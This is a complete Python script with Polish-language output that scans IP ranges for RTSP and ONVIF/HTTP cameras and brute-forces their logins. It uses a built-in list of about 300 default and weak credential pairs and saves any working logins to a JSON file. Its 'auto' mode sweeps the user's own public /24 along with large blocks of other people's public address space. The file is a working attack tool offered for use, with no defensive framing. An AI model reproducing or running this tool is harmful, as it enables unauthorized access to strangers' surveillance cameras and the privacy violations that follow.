import socket
import ipaddress
import requests
import time
import sys
import os
import json
import re
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.auth import HTTPDigestAuth

CREDS = [
("admin", "admin"), ("admin", "123456"), ("admin", "password"), ("admin", "root"),
("root", "root"), ("root", "123456"), ("admin", "12345"), ("admin", "000000"),
("admin", "111111"), ("admin", "123123"), ("admin", "abc123"), ("admin", "qwerty"),
("user", "user"), ("user", "password"), ("guest", "guest"), ("admin", "1234"),
("admin", "4321"), ("admin", "12345678"), ("admin", "87654321"), ("admin", "123456789"),
("admin", "666666"), ("admin", "888888"), ("admin", "999999"), ("supervisor", "supervisor"),
("support", "support"), ("operator", "operator"), ("admin", "Admin"), ("admin", "Administrator"),
("root", "toor"), ("root", "1234"), ("root", "password"), ("root", "admin"),
("admin", "password123"), ("admin", "pass"), ("admin", "123qwe"), ("admin", "qwe123"),
("admin", "1q2w3e"), ("admin", "3edc"), ("admin", "zaq1"), ("admin", "wsx"),
("admin", "!@#$"), ("admin", "1234567890"), ("admin", "654321"), ("admin", "987654321"),
("admin", "147258"), ("admin", "258369"), ("admin", "369258"), ("admin", "159753"),
("admin", "753159"), ("admin", "852456"), ("admin", "456852"), ("admin", "951753"),
("admin", "357951"), ("admin", "852147"), ("admin", "741852"), ("admin", "963852"),
("admin", "753951"), ("admin", "654789"), ("admin", "321654"), ("admin", "987654"),
("admin", "123654"), ("admin", "456123"), ("admin", "789456"), ("admin", "147789"),
("admin", "258147"), ("admin", "369147"), ("admin", "789321"), ("admin", "321789"),
("admin", "159357"), ("admin", "357159"), ("admin", "258456"), ("admin", "456258"),
("admin", "789123"), ("admin", "123789"), ("admin", "147258369"), ("admin", "258369147"),
("admin", "369147258"), ("admin", "951753456"), ("admin", "753159456"), ("admin", "456789123"),
("admin", "hikvision"), ("admin", "dahua"), ("admin", "123456a"), ("admin", "123456b"),
("admin", "11111111"), ("admin", "88888888"), ("admin", "66666666"), ("admin", "112233"),
("admin", "223344"), ("admin", "334455"), ("admin", "445566"), ("admin", "556677"),
("admin", "667788"), ("admin", "778899"), ("admin", "889900"), ("admin", "990011"),
("admin", "001122"), ("admin", "123456789a"), ("admin", "123456789A"), ("admin", "Aa123456"),
("admin", "Aa12345678"), ("admin", "1qaz2wsx"), ("admin", "qazwsx"), ("admin", "wsxedc"),
("admin", "edcrfv"), ("admin", "rfvtgb"), ("admin", "tgbnhy"), ("admin", "yhnujm"),
("admin", "ujmik"), ("admin", "ikol"), ("admin", "kolp"), ("admin", "lpok"),
("admin", "poiu"), ("admin", "iuyt"), ("admin", "ytrew"), ("admin", "rewq"),
("admin", "qwert"), ("admin", "asdf"), ("admin", "asdfg"), ("admin", "zxcv"),
("admin", "zxcvb"), ("admin", "xcvbn"), ("admin", "cvbnm"), ("admin", "qwertyuiop"),
("admin", "asdfghjkl"), ("admin", "zxcvbnm"), ("admin", "1234567890qwerty"), ("admin", "qwerty123456"),
("admin", "admin123"), ("admin", "password1"), ("admin", "Password1"), ("admin", "Admin123"),
("root", "toor123"), ("root", "toor1234"), ("root", "toor!"), ("admin", "123456!"),
("admin", "12345678!"), ("admin", "Abc123"), ("admin", "abc123!"), ("admin", "pass123"),
("admin", "pass1234"), ("admin", "123abc"), ("admin", "123ABC"), ("admin", "abcd1234"),
("admin", "qwerty123"), ("admin", "qwerty!"), ("admin", "1q2w3e4r"), ("admin", "zaq1xsw2"),
("admin", "wsxedc"), ("admin", "edcwsx"), ("admin", "rfvtgb"), ("admin", "tgbvfr"),
("admin", "yhnujm"), ("admin", "ujmnhb"), ("admin", "123456789q"), ("admin", "qwerty123456789"),
("admin", "adminadmin"), ("admin", "passwordpassword"), ("admin", "rootroot"),
("admin", "123456123456"), ("admin", "0000000000"), ("admin", "1111111111"),
("admin", "222222"), ("admin", "333333"), ("admin", "444444"), ("admin", "555555"),
("admin", "777777"), ("admin", "121212"), ("admin", "131313"), ("admin", "141414"),
("admin", "151515"), ("admin", "161616"), ("admin", "171717"), ("admin", "181818"),
("admin", "191919"), ("admin", "202020"), ("admin", "212121"), ("admin", "232323"),
("admin", "242424"), ("admin", "252525"), ("admin", "262626"), ("admin", "272727"),
("admin", "282828"), ("admin", "292929"), ("admin", "303030"), ("admin", "313131"),
("admin", "323232"), ("admin", "343434"), ("admin", "353535"), ("admin", "363636"),
("admin", "373737"), ("admin", "383838"), ("admin", "393939"), ("admin", "404040"),
("admin", "414141"), ("admin", "424242"), ("admin", "434343"), ("admin", "454545"),
("admin", "464646"), ("admin", "474747"), ("admin", "484848"), ("admin", "494949"),
("admin", "505050"), ("admin", "515151"), ("admin", "525252"), ("admin", "535353"),
("admin", "545454"), ("admin", "565656"), ("admin", "575757"), ("admin", "585858"),
("admin", "595959"), ("admin", "606060"), ("admin", "616161"), ("admin", "626262"),
("admin", "636363"), ("admin", "646464"), ("admin", "656565"), ("admin", "676767"),
("admin", "686868"), ("admin", "696969"), ("admin", "707070"), ("admin", "717171"),
("admin", "727272"), ("admin", "737373"), ("admin", "747474"), ("admin", "757575"),
("admin", "767676"), ("admin", "787878"), ("admin", "797979"), ("admin", "808080"),
("admin", "818181"), ("admin", "828282"), ("admin", "838383"), ("admin", "848484"),
("admin", "858585"), ("admin", "868686"), ("admin", "878787"), ("admin", "898989"),
("admin", "909090"), ("admin", "919191"), ("admin", "929292"), ("admin", "939393"),
("admin", "949494"), ("admin", "959595"), ("admin", "969696"), ("admin", "979797"),
("admin", "989898"), ("admin", "99999999"), ("admin", "1234567890!"), ("admin", "qwertyuiop!"),
("admin", "asdfghjkl!"), ("admin", "zxcvbnm!"), ("admin", "1234567890qwertyuiop"),
("admin", "qwertyuiopasdfghjkl"), ("admin", "zxcvbnm123456"), ("admin", "!QAZ2wsx"),
("admin", "1qazXSW@"), ("admin", "Qwerty123"), ("admin", "Qwerty123!"), ("admin", "Password123"),
("admin", "Password123!"), ("admin", "Admin123!"), ("admin", "1234567890qwe"),
("admin", "qwe1234567890"), ("admin", "zaq12wsx"), ("admin", "wsx2zaq1"),
("admin", "edc3rfv"), ("admin", "rfv3edc"), ("admin", "tgb4yhn"), ("admin", "yhn4tgb"),
("admin", "ujm5ik"), ("admin", "ik5ujm"), ("admin", "ol6p"), ("admin", "p6ol"),
("admin", "789456123"), ("admin", "456123789"), ("admin", "123789456"), ("admin", "9876543210"),
("admin", "0123456789"), ("admin", "1029384756"), ("admin", "5647382910"), ("admin", "9081726354"),
("admin", "0987654321"), ("admin", "1357924680"), ("admin", "2468135790"), ("admin", "369121518"),
]

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org", timeout=5)
        return r.text.strip()
    except:
        return None

def generate_auto_ranges():
    ranges = []
    pub = get_public_ip()
    
    if pub:
        net = ipaddress.ip_network(f"{pub}/24", strict=False)
        ranges.append(str(net))
        ranges.append("80.0.0.0/16")
        ranges.append("90.0.0.0/16")
        ranges.append("100.0.0.0/16")
        ranges.append("172.16.0.0/16")
        ranges.append("192.168.0.0/16")
        ranges.append("10.0.0.0/16")
    else:
        ranges.append("192.168.0.0/24")
        ranges.append("10.0.0.0/24")
    return ranges

def ip_range_to_list(network_str):
    try:
        net = ipaddress.ip_network(network_str, strict=False)
        return [str(ip) for ip in net.hosts()]
    except:
        return []

def scan_port(ip, port, timeout=2):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((ip, port)) == 0
    except:
        return False

def is_rtsp_camera(ip, port=554, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(b"OPTIONS * RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        data = s.recv(1024)
        s.close()
        return b"200 OK" in data or b"401 Unauthorized" in data
    except:
        return False

def is_http_camera(ip, port=80, timeout=3):
    try:
        url = f"http://{ip}:{port}/onvif/device_service"
        r = requests.get(url, timeout=timeout, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code in (200, 401, 403) and ("xml" in r.headers.get("Content-Type", "") or "onvif" in r.text.lower()):
            return True
        url2 = f"http://{ip}:{port}/cgi-bin/"
        r2 = requests.get(url2, timeout=timeout)
        return r2.status_code in (200, 401, 403)
    except:
        return False

def try_login_rtsp(ip, port, login, password, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        auth = base64.b64encode(f"{login}:{password}".encode()).decode()
        req = f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {auth}\r\n\r\n"
        s.send(req.encode())
        data = s.recv(1024)
        s.close()
        return b"200 OK" in data or b"401" not in data
    except:
        return False

def try_login_http(ip, port, login, password, timeout=3):
    try:
        url = f"http://{ip}:{port}/onvif/device_service"
        auth = HTTPDigestAuth(login, password)
        r = requests.get(url, auth=auth, timeout=timeout)
        if r.status_code == 200 or (r.status_code == 401 and "WWW-Authenticate" not in r.headers):
            return True
    
        url2 = f"http://{ip}:{port}/cgi-bin/"
        r2 = requests.get(url2, auth=(login, password), timeout=timeout)
        return r2.status_code == 200
    except:
        return False

def scan_ip(ip):
    found = []
    ports = [554, 80, 443, 8080]
    
    for port in ports:
        if not scan_port(ip, port, 1.5):
            continue
            
        is_cam = False
        if port == 554:
            is_cam = is_rtsp_camera(ip, port)
        else:
            is_cam = is_http_camera(ip, port)
            
        if not is_cam:
            continue
            
        creds = None
        for login, pwd in CREDS:
            if port == 554:
                ok = try_login_rtsp(ip, port, login, pwd)
            else:
                ok = try_login_http(ip, port, login, pwd)
            if ok:
                creds = (login, pwd)
                break
                
        time.sleep(0.05)  
        
        found.append({
            "ip": ip,
            "port": port,
            "protocol": "RTSP" if port == 554 else "HTTP",
            "login": creds[0] if creds else None,
            "password": creds[1] if creds else None,
            "found": bool(creds)
        })
        
    return found

def main():
    print("\n[+] SKANER KAMER RTSP/HTTP v2.0")
    print("[+] Wbudowana lista haseł: {} par".format(len(CREDS)))
    wybor = input("[?] Podaj zakres IP (np. 192.168.1.0/24) lub wpisz 'auto': ").strip()
    
    if wybor.lower() == 'auto':
        ranges = generate_auto_ranges()
        print(f"[+] Wygenerowano automatyczne zakresy: {ranges}")
        ip_list = []
        for r in ranges:
            ip_list.extend(ip_range_to_list(r))
    else:
        ip_list = ip_range_to_list(wybor)
        
    if not ip_list:
        print("[!] Nie znaleziono poprawnych adresów IP w podanym zakresie.")
        return
        
    print(f"[+] Rozpoczynanie skanowania {len(ip_list)} adresów IP...")
    
    results = []
    max_workers = 50
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(scan_ip, ip): ip for ip in ip_list}
        for future in as_completed(futures):
            try:
                res = future.result()
                if res:
                    for item in res:
                        results.append(item)
                        if item["found"]:
                            print(f"[ZNALEZIONO!] IP: {item['ip']} | Port: {item['port']} | Protokół: {item['protocol']} | Login: {item['login']} | Hasło: {item['password']}")
                        else:
                            print(f"[SKAN] IP: {item['ip']} | Port: {item['port']} | Brak danych logowania")
            except Exception as e:
                pass
                
    output_file = "wyniki_skanowania.json"
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=4, ensure_ascii=False)
    print(f"\n[+] Zakończono! Wyniki zapisano do pliku: {output_file}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Przerwano przez użytkownika.")
        sys.exit(0)
    except Exception as e:
        print(f"[FATAL] {e}")
        input("Naciśnij Enter aby zakończyć...")
        sys.exit(1)
